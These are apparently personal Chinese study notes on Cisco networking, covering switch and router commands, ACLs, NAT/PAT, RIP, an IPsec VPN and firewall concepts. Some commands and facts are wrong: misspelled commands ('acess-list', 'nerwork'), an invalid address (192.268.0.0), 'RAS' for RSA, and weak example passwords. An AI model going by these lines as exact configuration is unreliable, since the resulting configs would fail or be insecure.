20.1.1.254\t#在全局配置模式下，使用该命令给交换机配置网关#五、解决命令敲错后一直处于询问状态29. no ip domain-lookup\t#在全局配置状态下，使用该命令关闭域名解析，后面敲错命令就不会一直卡着\n\n3）路由器命令#路由器的命令和交换机命令基本一样#远程控制路由器&#x27;&#x27;&#x27;路由器的端口的物理状态默认是人为关闭的(administratively down)，因此需要使用no shutdown命令使其处于正常状态&#x27;&#x27;&#x27;1. ip address 10.1.1.1 255.255.255.0    #在进入某个具体端口后，使用该命令给该端口配置ip和掩码,交换机端口不能配ip2. line vty 0 4   #在全局配置模式下，使用该命令，使路由器打开虚拟终端端口，0 4 表示允许5个人通过该端口访问路由器3. password 123456   login\t\t#在进入路由器的虚拟端口后，以上俩条命令一起使用，给进入该进入路由器加密&#x27;&#x27;&#x27;设置完成之后，就可以使用telnet远程登陆该路由器，不过需要注意的是，当使用远程登陆时，若是之前没有给特权模式设置密码，此时进不去特权模式，但是使用console线直接连就没有这种限制,因此若是想要远程控制路由器，需要实现给特权模式设置密码&#x27;&#x27;&#x27;4. transport input ssh\t#进入路由器的虚拟端口，将远程访问端口改成SSH（22端口），路由器默认打开是telnet（23端口），该命令后面的参数可以写 all:22，23端口都监听；None:一个端口都不开；ssh:打开22端口； telnet:打开23端口;5. ip domain-name r1.xin.com\t#在全局配置模式下，给路由器配置域名（与之前学的域名没有关系） 6. crypto key generate rsa \t\t#使用rsa算法生成密钥（使用该命令的前提：路由器配置好了主机名与域名）&#x27;&#x27;&#x27;使用第4条命令开启ssh后，还需要生成密钥，&#x27;&#x27;&#x27;7. login local #进入某个端口，设置用户密码，且密码与本地数据库进行配对，一般配合建库命令（下一条命令）配合使用，实现身份验证8. username xin password 123.com  #新建本地库用户，账号为xin 密码为123.com&#x27;&#x27;&#x27;使用ssh登陆，若是设置了本地用户数据库，则需要使用下面的命令（1）连接，普通的password login的加密使用命令（2）&#x27;&#x27;&#x27;9. （1）ssh -l username 10.1.1.254\t（2）ssh -l hostname 10.1.1.254&#x27;&#x27;&#x27;使用telnet登陆，使用如下命令即可，不同的是，若设置了用户本地数据库，则需要输入用户名和密码，普通的只需要输入密码&#x27;&#x27;&#x27;10. telnet 10.1.1.254\n\n抓包验证帧结构：5）物理层：​\t\t\t\t将数据帧转化为数字信号:比特（bit）​\t\t\t\t代表物理信道：网线，光纤，空气​\t\t\t\t物理层传输单元：比特:bit；8bit &#x3D; 1Byte; 1024B &#x3D; 1KB; 1024KB &#x3D; 1MB\n​\t\t\t\t信号：​\t\t\t\t\t1）模拟信号：无法复原​\t\t\t\t\t2）数字信号：物理层传输的是数字信号，特有的信号复原功能​\t\t\t\t\t俩者统称为电信号​\t\t\t\t\t3）光信号：一般光纤传输的都是红光\t​\t\t\t\t\t\t光纤的分类：\t\t\t\t\t\t​\t\t\t\t\t\t\t（1）.单模光纤：只能传输一种光，效率较高，一般是黄色​\t\t\t\t\t\t\t（2）.多模光纤：能传输多种光，但是当距离过长会导致效率变低，因为各种光之间会互相干扰，一般是橙色&#x2F;蓝色​\t\t\t\t\t\t网线&#x2F;双绞线:​\t\t\t\t\t\t\t（1）5类双绞线​\t\t\t\t\t\t\t（2）超5类双绞线​\t\t\t\t\t\t\t（3）6类双绞线​\t\t\t\t\t\t\t（4）7类双绞线​\t\t\t\t\t\t网线标准：​\t\t\t\t\t\t\t\tT568A: 白绿，绿，白橙，蓝，白蓝，橙，白棕，棕​\t\t\t\t\t\t\t\tT568B: 白橙，橙，白绿，蓝，白蓝，绿，白棕，棕​\t\t\t\t\t\t网线的用途分类：​\t\t\t\t\t\t\t\t交叉线：网线一端用A标准，另一端用B标准，即计算机用1，2通道发数据（白绿，绿），用3，6通道收（白绿，\t\t\t\t\t\t\t\t\t\t\t\t绿），一般是同种设备间使用。（具有三层及三层以上的设备统称为同种设备）​\t\t\t\t\t\t\t\t直通线：两端都是A或都是B，异种设备间使用。现在市面上的网线一般都是B线序\t\t\t\t​\t\t\t\t\t\t\t\t全反线：一端为A，另一端为反A，也称console线，对路由器，防火墙等设备进行初始化操作\t​\t\t\t\t\t\t\t注：现在网口一般都带有反转功能，即使没有正确使用网线，也能使用\n五层协议结构关系图：13ACL​\tAccess Control List：访问控制列表，是一种包过滤技术；\n​\t其是基于IP包头的ip地址，四层TCP&#x2F;UDP头部的端口号、[5层数据] 进行过滤；（一般不建议对五层数据进行过滤，会降低效率）；基于三层和四层过滤；\n​\tACL在路由器上配置，也可以在防火墙上配置（一般称为策略）；\n13.1ALC主要分为俩大类1）标准ACL​\t\t表号：1-99\n​\t\t特点：只能基于源ip对包进行过滤\n–命令#创建条目conf t\taccess-list 表号 permit/deny 源ip/源网段 反子网掩码&#x27;&#x27;&#x27;注意：反子网掩码是将正子网掩码0和1倒置：例如 255.255.255.0 ---反子网掩码为---- 0.0.0.255&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;反子网掩码的作用：用于匹配，与0对应的需要严格匹配，与1对应的不匹配&#x27;&#x27;&#x27;#例子1.access-list 1 deny 10.1.3.1 0.0.255.255&#x27;&#x27;&#x27;上面这一句的作用为：ip满足10.1开头的ip则被禁止通过&#x27;&#x27;&#x27;2.acess-list 1 deny 10.1.1.1 0.0.0.0&#x27;&#x27;&#x27;上面这一句的作用为：禁止ip为10.1.1.1的ip通过（拒绝某台主机的通过），可以简写为下面的形式：&#x27;&#x27;&#x27;access-list 1 deny host 10.1.1.1\t\t&#x27;&#x27;&#x27;拒绝所有ip为10.1.1.1的主机&#x27;&#x27;&#x27;3.access-list 1 deny 0.0.0.0 255.255.255.255&#x27;&#x27;&#x27;上面这一句的作用为：拒绝所有人，也可以简写为以下的形式：&#x27;&#x27;&#x27;access-list 1 deny any#查看ACL表show ip access-list [表号]\t#不加表号，查看所有的ACL表；加上表号，查看具体某张表#将ACL表应用到接口int f0/x\tip access-group 表号 in/out\t#进入某个端口中，使用该命令ACL表应用到该接口#删除整张表no access-list 表号   #在全局配置模式下，使用该命令，删除整张表\n\n2）扩展ACL​\t\t表号：100-199\n​\t\t特点：可以基于源ip、目标ip、端口号、协议等对包进行过滤\n–命令#创建条目conf t\taccess-list 100 permit/deny 协议 源ip/源网段 反子网掩码 目标ip/目标网段 反子网掩码 [eq 端口号]&#x27;&#x27;&#x27;需要满足所有的条件才能执行动作，最后的端口号是一个可选项，前面的参数是一定要写的&#x27;&#x27;&#x27;其中学过的协议有：tcp/udp/icmp/ip；（arp出不了路由器，因此不必考虑）;其中若使用了端口号，则必须是tcp/udp协议 #例子1. access-list 100 permit tcp host 10.1.1.1 host 20.1.1.3 eq 80   access-list 100 permit icmp host 10.1.1.1 20.1.1.0 0.0.0.255 [echo-reply]   access-list 100 deny ip host 10.1.1.1 20.1.1.0 0.0.0.255   access-list 100 permit any any&#x27;&#x27;&#x27;以上的条目的作用：10.1.1.1 PC可以访问20.1.1.3中传输协议为tcp协议且端口为80的服务；&#x27;&#x27;&#x27;允许10.1.1.1 PC向20.1.1.0/24网段发送icmp回包（类型为0）；最后的 echo-reply参数可能有错&#x27;&#x27;&#x27;但是禁止10.1.1.1访问20.1.1.0/24网段的其它服务；&#x27;&#x27;&#x27;其它ip正常访问；\n\n3）ACL原理​\t（1）ACL表必须应用到接口的进或出方向才生效​\t（2）一个接口的一个方向只能应用一张表​\t（3）进还是出方向应用，取决于流量控制的总方向​\t（4）ACL表是严格自上而下检查每一条，所以要注意书写顺序；大部分ACL表的最后有一个默认策略 any deny：任何流量均不可通过​\t（5）每一条策略都是由条件和动作组成，当某流量没有满足条件时，则继续检查下一条；若满足则直接放行，后面的不再检查​\t（6）标准ACL尽量写在靠近目标的地方​\t（7）用ACL做流量控制的过程：​\t\t\t\t首先判断ACL写的位置：哪个路由器？哪个接口的哪个方向？​\t\t\t\t再考虑怎么写？​\t\t\t\t\t首先判断最终是要允许所有还是拒绝所有​\t\t\t\t\t其次注意：将严格的策略控制写在前面​\t（8）一般情况下，标准或扩展ACL一旦编写好，无法修改某一条，也无法删除某一条，也无法修改顺序，也无法在中间插入新的条目，只能一直在最后添加新的条目​\t\t\t\t若想修改、插入或删除，只能删除整张表，重新写\n–实验\n4）命名ACL​\t\t并不是第三类ACL，只是对标准或扩展ACL的功能进行一些扩展\n–作用：​\t\t\t可以对标准或扩展ACL进行自定义命名\n–优点：​\t\t\t1.自定义命名更容易辨认（可读性较强），也便于记忆\n​\t\t\t2.通过命名ACL可以进入任何ACL（标准或扩展），之后便可以任意修改某一条，或删除某一条，也可以往中间插入某一条\n#通过ACL进入标准或扩展ACLconf t\tip access-list standard/extended 表名(表号)\n\n–命令#命名ACL的创建conf t \tip access-list extended kz-80-oa\t\t#使用该命令之后，会进入一个条目编写环境\tpermit tcp 192.268.0.0 0.0.255.255 host 10.1.1.1 eq 80\t#在条目编写环境下，可以直接从permit/deny开始编写命令\tpermit tcp 172.16.0.0 0.0.255.255 host 10.1.1.1 eq 80\tdeny ip 192.168.0.0 0.0.255.255 host 10.1.1.0&#x27;&#x27;&#x27;在条目编写环境，可以直接使用以下命令删除某条条目no 条目标号/条目命令\t\t\t&#x27;&#x27;&#x27;其中条目标号为：通过 show ip access-list extended kz-80-oa 显示ACL列表的第一列值&#x27;&#x27;&#x27;若要在某俩条条目之间插入一个条目，则使用下面的命令条目标号 permit tcp 172.16.0.0 0.0.255.255 host 10.1.1.1 eq 80\t\t&#x27;&#x27;&#x27;其中 条目标号 的取值范围在 需要插入的俩条条目的条目标号之间即可\n\n5）实验\n14NAT​\tNetwork Address Translations : 网络地址转换\n​\tNAT主要实现公私有地址的转换，一般是路由器或者防火墙上来完成，不建议在三层交换机上配置\n​\t主要是为了解决ipv4地址不够用的问题\n14.1IP地址的分类1）公网ip​\t\t公网ip只能在公网中使用，公网上不允许出现私有ip地址\n​\t\t只用于将内网服务器映射到公网的ip被称为虚拟公网ip（vip）\n2）私网ip​\t\t私网ip只能在私网中使用，私网ip可以重复在内网中使用\n​\t\t私有地址范围：​\t\t\t（1）10.0.0.0&#x2F;8​\t\t\t（2）172.16.0.0&#x2F;16-172.31.0.0&#x2F;16​\t\t\t（3）192.168.0.0&#x2F;16\n14.2NAT的三大类​\t在路由器上配置NAT时，还需要定义内外网端口，定义该端口的作用：​\t\t内到外：转换源IP​\t\t外到内：转换目标\n1）静态NAT​\t\t当内网访问外网的时候，通过路由器中的NAT地址转换表，将源ip地址转换为公网ip\n​\t\t缺点：​\t\t\t1.NAT地址转换表是固定的​\t\t\t2.只能一个人上网，当内网其它ip要上网时，需要修改NAT地址表\n​\t\t注意：静态NAT也称为1对1映射，其也可以与PAT共同使用，此时称为静态PAT（端口映射技术）\n2）动态NAT（基本不用）​\t\t当内网访问外网的时候，同样是通过路由器中的NAT地址转换表来将源ip替换成公网ip，但是此时该NAT地址转换表不是固定的，而是当有人从内网访问外网时，通过动态NAT映射，自动在NAT地址转换表中生成一条条目，当该条目中记录的内网ip没有发送包后经过24小时，该条目会自动删除，此时内网中其他人即可上网。\n​\t\t动态NAT映射：路由器中会生成内部地址池和外部池，其中内部地址池记录内网中的ip&#x2F;网段，外部池中记录外网ip，若是内网中的某个ip访问外网时，会将内网ip与内部地址池中的ip&#x2F;网段进行匹配，匹配成功，则将其与外部池中的公网ip进行映射，并记录在NAT地址转换表中，记录的内容为 源ip 公网ip。\n​\t\t缺点：​\t\t\t1.虽然NAT地址表不是固定的，但是内网中多台设备需要上网，而外部池中的公网ip较少，需要竞争外部池中的公网ip\n3）PAT（端口地址转换：Port Address Translation）-端口复用技术​\t\t当内网访问外网时，同样通过动态NAT映射在NAT地址转换表中动态形成条目，但与上面俩中不同的是，此处外部池中的公网ip是可以复用的，并且在NAT地址表中记录条目的时候，不仅会记录源ip和公网ip，还会记录帧中的四层数据的端口号以及路由器自己生成的唯一端口号,保证外网往内网回数据的时候能够通过NAT地址转换表**唯一识别内网中的设备**，且若某台设备没有继续发送数据包，则在60s后，由该设备访问外网生成的条目回自动删除。\n​\t\t与静态NAT和动态NAT的不同在于：不仅做地址转换，还做端口转换\n​\t\t端口号的范围：0-65535（所有设备的端口号均是在这个范围）\n14.3NAT命令#1.定义内网端口int f0/0 \tip nat inside#2.定义外网端口int f0/1\tip nat outside\t#3.配置PAT#3.1定义内部地址池access-list 1 permit 192.168.0.0 0.0.255.255\t&#x27;&#x27;&#x27;和ACL的命令一样，但是此处不是作为ACL,而是作为容器，匹配后面规则的ip都属于1容器#3.2做PAT动态映射conf t\tip nat inside source list 1 int f0/1 overload\t#4配置静态端口转换conf t \tip nat inside source static tcp 192.168.1.3 80 100.1.1.2 80\t&#x27;&#x27;&#x27;静态端口转换#5.查看NAT地址转换表show ip nat translations#6.清空NAT地址转换表clear ip nat translations *\n\n–实验要求：将两台服务器通过端口映射技术映射出去（使用同一个公网ip映射和使用不同公网ip映射）\n\n15动态路由​\t基于某种路由协议实现的\n\n动态路由的特点\n\n​\t\t1）减轻管理负担​\t\t2）需要占用网络带宽\n\n动态路由协议概述\n\n​\t\t路由器之间用来交换信息的语言\n\n度量值\n\n​\t\t跳数、带宽、负载、时延、可靠性、成本\n\n收敛\n\n​\t\t所有的路由表都达到一致状态的过程\n\n静态路由与动态路由的比较\n\n​\t\t网络中静态路由和动态路由互相补充\n15.1按照路由执行的算法分类（路由协议的分类）\n距离矢量路由协议依据从源网络到目标网络所经过的路由器的个数选择路由；如RIP、IGRP\n链路状态路由协议综合考虑从源网络到目标网络的各条路径的情况选择路由；如OSPF、IS-IS\n\n\t\t\t\t\t\n1）RIP​\tRIP是距离-矢量路由选择协议\n–基本概念\n定期更新：即使最后达到收敛状态，依旧每隔30s定期更新\n邻居：与相邻的路由器通信，发送自己路由表给其它路由器，且接收其它路由器的路由表来更新自己的路由表\n广播更新：通过广播通信\n全路由表更新：每次都发送全局的路由表\n\n​\t注意：\n\n路由器首先会学习到直连路由\n更新周期30s到时，路由器会向邻居发送路由表\nRIP度量值为跳数：最大跳数为15跳，16跳为不可达\nRIP更新时间：每隔30s发送路由更新信息，UDP520端口\nRIP路由更新消息：发送整个路由表信息\n路由环路：当某条线路故障，路由表会将该线路标记为不可达，若此时R2向R3发送路由更新信息，R3会学到错误的40.0.0.0的路由信息，导致后续R3向R2发送路由更新信息时，也会将40.0.0.0的错误信息带给R2（由于最开始R2的40.0.0.0的信息就是R3发送给R2的，因此即使此时R2路由表中的40.0.0.0跳数比R3的低，R2依旧会学习R3的40.0.0.0的路由信息），最终导致路由环路\n\n\n​\t解决方法：执行水平分割可以阻止路由环路的发生（RIP路由器默认开启该功能）​\t\t\t（1）从一个接口学习到的路由信息，不再从这个发送出去​\t\t\t（2）同时也能减少路由更新信息占用的链路带宽资源\n–命令#开启RIP路由协议router rip\t&#x27;&#x27;&#x27;全局配置模式下，使用该命令，开启rip并进入rip路由协议的配置选项\tversion 2\t\t&#x27;&#x27;&#x27;选择版本,version 1发送更新信息不带子网掩码，version 2会带子网掩码\tnetwork 10.0.0.0\t&#x27;&#x27;&#x27;激活某个接口（该接口的网段：必须使用A,B,C类地址的写法）\tnerwork 20.0.0.0\tno auto-summary\t\t&#x27;&#x27;&#x27;取消路由器自动汇总：汇总会将收到路由ip自动归类为A,B,C类地址,从而使用这三类地址的子网掩码，而不是使用收到的路由信息中的子网掩码\t#查看路由器使用的路由协议show ip protocols\n\n–综合实验\n16VPN​\tVPN：Vitural Private Network（虚拟专有网络&#x2F;虚拟专网）：VPN只是一种技术，使用PKI技术，来保证数据安全的三要素（机密性，完整性，身份验证）\n​\t加密技术：\n\n对称加密：加密与解密使用相同的密钥；密钥是通信双方协商生成；生成过程是明文通信的，因此密钥容易泄露！速度快！\n\n​\t\t\t对称加密算法：DES、3DES、AES\n\n非对称加密：使用公私钥加密数据；公私钥成对出现，互为加解密关系；公私钥不能互相推算；双方交换公钥，并使用对方的公钥加密实现机密性；使用自己的私钥进行签名，实现身份验证；速度慢，安全性高\n\n​\t\t\t非对称加密算法：RAS，DH\n\n完整性算法&#x2F;hash值算法：MD5，SHA\n\n16.1vpn的作用​\tVPN可以实现在不安全的网络上（一般指互联网），安全的传输数据，类似专网一样\n16.2VPN的类型1）远程访问VPN（Remote Access VPN）\n一般用在个人到安全连接到企业内部！\n\n一般出差员工&#x2F;在家办公，安全连接内网时使用！\n\n一般公司部署VPN服务器，员工在外拨号连接VPN即可！\n\n\n​\t\t常见RA-VPN协议：PPTP VPN、L2TP VPN、SSTP VPN（前面三种基本过时）​\t\t\t\t\t\t\t\t\t  EZvpn&#x2F;easyvpn（思科私有）​\t\t\t\t\t\t\t\t\t  SSL VPN（常见）\n2）点到点VPN\n一般用在企业对企业安全连接！\n\n一般需要在俩个企业总出口设备之间建立VPN通道！\n\n\n​\t\t常见的点到点VPN：IPsecVPN\n16.3点到点VPN：IPsecVPN\n属于点到点VPN，可以在2家企业之间建立VPN隧道！\nVPN隧道优点：安全性！合并俩家企业内网！\nVPN隧道技术：\n\n​\t\t\t（1）传输模式：只加密上层数据，不加密私有IP包头​\t\t\t（2）隧道模式：加密整个私有IP包，包括IP包头，更安全，速度慢\n1）IPsecVPN分为2大阶段：–第一阶段：管理连接​\t\t\t目的：通信双方设备通过非对称加密算法来加密对称算法所使用的对称密钥！\n​\t\t\t命令：双方配置只有传输集名称、lifetime、以及 对方公网ip地址 不一样，其余全要一样\nconf t\tcrypto isakmp policy 1\t\t\t&#x27;&#x27;&#x27;传输集/策略集 IKE:互联网密钥交换，后面的参数1代表策略名\t\tencryption des/3des/aes\t\t&#x27;&#x27;&#x27;传输数据使用的对称加密算法密钥\t\thash md5/sha\t\t\t\t&#x27;&#x27;&#x27;完整性验证算法\t\tgroup 1/2/5\t\t\t\t\t&#x27;&#x27;&#x27;默认使用DH非对称加密算法，此处选择DH 1/2/5\t\tauthentication pre-share\t&#x27;&#x27;&#x27;设置预共享密钥，该密钥与数据一起经过完整性算法，保证数据不被篡改（身份验证）；预共享密钥，需要双方配置一致，因为其不在互联网上传播\t\tlifetime 秒\t\t\t\t\t&#x27;&#x27;&#x27;不设置的话，默认86400秒（24小时），多久密钥过期\t\texit\tcrypto isakmp key 预共享密钥 address 对方的公网ip地址\n\n–第二阶段：数据连接​\t\t\t目的：通过对称加密算法加密实际所要传输的私网数据！\n​\t\t\t命令：除第一条定义触发流量外，双方配置必须一样\nconf t\taccess-list 100 permit ip 192.168.0.0 0.0.255.255 172.16.0.0 0.0.255.255\t&#x27;&#x27;&#x27;流量控制;定义vpn触发流量\tcrypto ipsec transform-set 传输模式名 esp/ah-des/3des/aes esp/ah-md5/sha-hmac\t&#x27;&#x27;&#x27;倒数第二个参数用于数据加密，最后一个参数用于身份认证和完整性，因此第一个选ESP,第二个选AH； 传输模式名可以自定义，后面需要使用同样的esp加密和esp/ah认证时，可以直接使用自定义名称\t&#x27;&#x27;&#x27;ESP：支持加密及认证（身份验证+完整性） AH：只支持认证（身份验证+完整性）认证力度比ESP强；若是第一阶段定义了加密密钥，则此阶段只能使用ESP,而可选的三个对称加密算法都能使用第一阶段提供的密钥进行加密，因此可以不同，但是建议一致\t&#x27;&#x27;&#x27;例如\tcrypto ipsec transform-set xin esp-aes esp-sha-hmac\t\t&#x27;&#x27;&#x27;使用aes对数据加密，使用sha和hmac进行身份认证；hmac为预共享密钥，同时这一条流程命名为 xin \n\n–最后一步：让配置在端口上生效​\t\t\t创建MAP映射表（思科）：将上面的配置汇总到一张表中\nconf t\tcrypto map map名 1 ipsec-isakmp\t\t&#x27;&#x27;&#x27;参数1的作用：一个外网端口只能应用一张map表，意味着当需要与多个目标建立vpn时，使用参数1做区分，即通过该参数可以做到一张map对应多个vpn配置,且区分依据为该参数（或者理解为隧道号）\t\tmatch address 100\t\tset transform-set xin\t\tset peer 对方的公网ip地址\t\texit\t\t&#x27;&#x27;&#x27;将map表应用到外网端口int f0/1\tcrypto map map名\t&#x27;&#x27;&#x27;查看命令show crypto isakmp policy\t\t&#x27;&#x27;&#x27;查看阶段一的配置策略集show crypto ipsec transform-set &#x27;&#x27;&#x27;查看第二阶段的传输模式show crypto isakmp sa\t\t\t&#x27;&#x27;&#x27;查看阶段一状态show crypto ipsec sa\t\t\t&#x27;&#x27;&#x27;查看阶段二的状态\n\n2）当外网端口同时配置了PAT和NAT后，生效的先后顺序？​\t\t内网—》外网：路由—-NAT—-VPN—出去\n​\t\t注意：只有当源ip与路由内网处于同一网段才会经过NAT，否则直接  路由-----VPN----出去\n3）实验\n\n16.3远程VPN：\nPPTP VPN、L2TP VPN一般windows自带，SSL VPN需要下载软件；前两个软件使用的端口号是 TCP 1723\n\n需要在公司搭建VPN服务器\n\nVPN服务器需要对VPN客户端进行身份验证\n\nVPN服务器需要给VPN客户端下发权限及IP地址（私网）\n\n\n1）实验​\t要求：开启三台虚拟机：一台XP，两台Windows2003；将XP视作为国内PC，其中一台win2003作为VPN服务器，另一台win2003作为国外PC\n—准备工作\nXP桥街到vmnet1，ip设置为100.1.1.2&#x2F;24；VPN服务器购买俩快网卡，其中一张网卡桥接到vmnet1，ip设置为100.1.1.1&#x2F;24，另一张网卡桥接到vmnet2，ip设置为200.1.1.1&#x2F;24；国外PC桥接到vmnet2，IP设置为200.1.1.2&#x2F;24\n首先在国外PC上安装IIS服务器并发布一个网站\n接着在VPN服务器上开启VPN服务：管理工具—-路由和远程访问—-右键—-配置并启用路由访问—–自定义设置—选择vpn访问、拨号访问、NAT和基本防火墙—-完成即可\n由于需要拨号进行身份验证，需要在VPN服务器本地创建一个用户，并在用户属性中的拨入菜单中的远程访问权限的子选项中，选择允许访问\n有了身份验证还不够，当身份验证成功之后，VPN服务器还需要给用户下发ip：服务器—右键—-属性—-IP菜单—选择静态IP—添加—设置起始私有IP和结束IP—完成\n\n​\t\t注意：属性菜单中的安全可以选择使用windows身份验证还是RADIUS身份验证；前者使用本地账号验证，后者使用域身份验证\n\n最后一项配置：NAT；服务器子列表中—-IP路由选择—–子列表NAT/基本防火墙—-右键新增接口（注意接口选择：选择国外网卡）—-公用接口连接到internet—在此接口上启用NAT—-完成\n\n—开始在XP上拨号建立VPN连接（PPTP）（过程随windows版本变化而变化）\n网络邻居—-左侧创建一个新的连接—-下一步选择连接到我的工作场所的网络—-下一步选择虚拟专用网络连接—-公司名自定义即可—-下一步主机名或ip地址填写VPN服务器的ip地址—-下一步勾选在桌面创建快捷方式（可选）—-完成—-进入身份验证—–输入服务器中提前创建好的账号密码即可\n\n—扩展知识：PC也有路由表\n查看PC路由表的命令\nroute print\t&#x27;&#x27;&#x27;一旦拨号成功，PC路由表中会多出一条默认路由，指向VPN服务器的IP地址，且优先级比指向网关的默认路由更高，意味着除了访问本地局域网，其它流量都会被送到隧道\n\n17防火墙17.1防火墙的基本概念\n防火墙的定义：是一款具备安全防护功能的网络设备\n\n1）隔离网络：​\t（1）将需要保护的网络与不可信任网络进行隔离，隐藏信息并进行安全防护\n17.2防火墙的基本功能\n访问控制：ACL\n攻击防护：主要防护三层，四层数据\n冗余设计：具有热备份功能\n路由、交换：具有路由器和交换机的功能\n日志记录：记录流量\n虚拟专网VPN：能建立隧道\nNAT：地址转换功能\n\n17.3防火墙产品及厂家\n防火墙产品：H3C U200系列\n\n\n\n防火墙产品：juniper550M\n\n\n\n防火墙产品：天融信\n\n\n17.4区域隔离1）防火墙区域概念\n内部区域\nDMZ区域：称为“隔离区”，也称“非军事区&#x2F;停火区”\n外部区域\n\n\n17.5防火墙的分类\n按防火墙形态\n\n软件防火墙\n硬件防火墙\n\n\n按技术实现（硬件）\n\n包过滤防火墙\n状态检测包过滤防火墙\n应用（代理）防火墙\nWAF防火墙\n应用层防火墙\n\n\n软硬件防火墙的区别\n\n\n\n1）防火墙的发展史\n包过滤防火墙：最早的防火墙技术之一，功能简单，配置复杂\n\n应用网关&#x2F;应用代理防火墙：最早的防火墙技术之二，连接效率低，速度慢\n​\t每个代理需要一个不同的应用进程，或一个后台运行的服务程序，对每个新的应用必须添加针对此应用的服务程序，否则不能使用该服务​\t优点：安全性高，检测内容​\t缺点：连接性能差，可伸缩性差\n\n状态检测防火墙：现代主流防火墙，速度快，配置方便，功能较多\n​\t检测流程（省略版）：\n\nDPI防火墙（Deep Packet Inspection）：未来防火墙的发展方向，能够高效的对第七层数据进行检测\n\n\n2）衡量防火墙性能的五大指标：\n吞吐量：在不丢包的情况下单位时间内通过的数据包流量\n时延：数据包第一个比特进入防火墙到最后一比特从防火墙输出的时间间隔\n丢包率：通过防火墙传送时所丢失数据包数量占所发送数据包的比率\n并发连接数：防火墙能够同时处理的点对点连接的最大数目\n新建连接数：在不丢包的情况下每秒可以建立的最大连接数\n\n3）防火墙的典型应用\n标准应用\n\n透明模式\n​\t透明模式&#x2F;桥模式一般用于用户网络已经建设完毕，网络功能基本已经实现的情况下，用户需要加装防火墙以实现安全区域隔离的要求；\n​\t一般将网络分为内部网、DMZ区和外部网\n\n路由模式\n​\t路由模式&#x2F;NAT模式\n\n\n混杂模式\n一般网络情况为透明模式和路由模式的混合\n\n\n\n\n\n17.6配置、实验\n实验一：验证区域隔离及策略编写\nPC配置IP及网关\n防火墙：创建区域—-》接口加入到区域\n接口配置ip、配置路由（本实验不需要配置）\n写策略并验证\n\n实验二：做源转换：SNAT​\t要求：在实验一的基础上，将外网PC的网关去掉！此时外网PC无法向内网回包！（模拟外网环境）\n\n配置源转换（PAT），保证inside 和 dmz能够上网\n\n实验三：做目标转换：DNAT​\t要求：在实验1-2的前提下：\n\n把DMZ区域的2003部署为web服务器，并发布出去\n\n做DNAT\n写策略：放行outside —-&gt;  dmz的172.16.1.1:80才放行\n\n\n使用outside区域的2003（外网PC）通过访问http://100.1.1.88\n\n\n实验四：应用层过滤（内容过滤）​\t要求：在实验1-3的基础上：\n\n将外网的2003部署为公网的某web服务器及DNS服务器\n此时内网及DMZ区域的PC均能通过域名访问外网网站\n做URL过滤。结果一般网站可以访问，黑名单URL禁止访问\nhttp内容过滤，结果包含违禁词的网站禁止访问\n\n\n\n","categories":["note"],"tags":["网络安全"]},{"title":"其它","url":"/2025/01/03/%E5%85%B6%E5%AE%83/","content":"\n      \n        \n      \n      \n        \n          \n          \n            您好, 这里需要密码.\n          \n        \n        \n      \n    \n    ","categories":["other"],"tags":["other","encrypt"]}]